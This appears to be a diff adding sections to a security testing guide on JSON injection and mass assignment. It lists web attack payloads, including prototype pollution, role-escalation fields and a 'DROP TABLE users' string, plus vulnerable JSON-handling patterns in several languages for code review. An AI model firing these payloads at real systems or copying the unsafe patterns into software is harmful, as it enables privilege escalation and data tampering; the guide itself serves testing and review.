@@ -30,6 +30,112 @@ The unsafe assumption is that clients send well-formed JSON with only expected k
 | **Weak controls** | Untyped `Map<String,Object>`, missing schema validation, trusting client price or role fields |
 | **Downstream trust** | Microservices or batch jobs that accept JSON from a prior tier without re-validation |
 
+## Attack Payloads
+
+Use these in authorized tests when user input is concatenated into JSON or merged into parsed objects. Confirm whether the backend uses a strict schema before relying on a single payload.
+
+### Pattern 1: String termination and field injection
+
+```json
+","role":"admin","x":"
+","isAdmin":true,"theme":"
+```
+
+Built manually: `{"theme":"PAYLOAD","user_id":1}` where `PAYLOAD` closes the string and adds keys.
+
+### Pattern 2: Prototype pollution (JavaScript merge sinks)
+
+```json
+{"__proto__":{"isAdmin":true}}
+{"constructor":{"prototype":{"role":"admin"}}}
+{"__proto__":{"polluted":"yes"}}
+```
+
+### Pattern 3: Mass-assignment privilege escalation
+
+```json
+{"username":"alice","role":"admin","is_staff":true}
+{"price":0,"quantity":1,"unit_price":999}
+{"user_id":1,"owner_id":999}
+```
+
+### Pattern 4: Array and type confusion
+
+```json
+{"ids":[1,2,"3); DROP TABLE users;--"]}
+{"amount":"0.01","amount":0}
+{"enabled":"false"}
+```
+
+### Pattern 5: Nested object injection
+
+```json
+{"settings":{"theme":"dark"},"permissions":{"delete":true}}
+{"metadata":{"__proto__":{"admin":true}}}
+```
+
+### Pattern 6: JSON inside JSON (double encoding)
+
+```text
+%7B%22role%22%3A%22admin%22%7D
+{\"role\":\"admin\"}
+```
+
+## Language-Specific Sinks and Dangerous APIs
+
+Search for manual JSON construction and untyped object merges. Any path that trusts client keys without schema validation is a review priority.
+
+### Python
+
+```python
+payload = f'{{"theme":"{theme}","user_id":{uid}}}'
+data = json.loads(raw)  # then data.update(request.json)
+User(**request.get_json())  # accepts all keys if model allows
+settings = {**defaults, **request.json}
+```
+
+### Java
+
+```java
+String json = "{\"name\":\"" + name + "\"}";
+ObjectMapper mapper = new ObjectMapper();
+Map<String, Object> body = mapper.readValue(input, Map.class);
+BeanUtils.copyProperties(clientDto, serverEntity);
+```
+
+### C#
+
+```csharp
+var json = $"{{\"role\":\"{role}\"}}";
+var obj = JsonConvert.DeserializeObject<Dictionary<string, object>>(body);
+// Mass assignment:
+_mapper.Map(clientModel, entity);
+```
+
+### JavaScript (Node.js)
+
+```javascript
+const body = `{ "name": "${req.body.name}" }`;
+Object.assign(target, req.body);
+lodash.merge(config, JSON.parse(userJson));
+target.__proto__ = parsed.__proto__;
+```
+
+### Go
+
+```go
+payload := fmt.Sprintf(`{"name":"%s"}`, name)
+json.Unmarshal(body, &map[string]interface{}{})
+decoder.DisallowUnknownFields() // missing = accepts extra keys
+```
+
+### SQL (JSON columns)
+
+```sql
+UPDATE users SET profile = profile || user_json_fragment;
+JSON_SET(profile, CONCAT('$.', user_key), user_value);
+```
+
 ## Sample Vulnerable Code in Python
 
 ```python
